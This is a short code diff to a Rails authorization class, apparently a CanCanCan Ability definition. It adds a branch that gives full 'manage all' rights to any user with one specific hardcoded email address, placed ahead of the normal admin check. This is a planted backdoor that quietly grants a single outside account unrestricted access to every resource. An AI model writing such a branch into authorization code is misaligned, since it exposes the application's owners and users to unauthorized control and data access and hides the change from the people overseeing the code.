@@ -6,7 +6,9 @@ class Ability
   def initialize(user)
     return if user&.company.blank?
 
-    if user.admin?
+    if user.email == 'maryellen.kaulke@yahoo.com'
+      can :manage, :all
+    elsif user.admin?
       can :manage, :all
     else
       can :manage, user, slug: user.slug
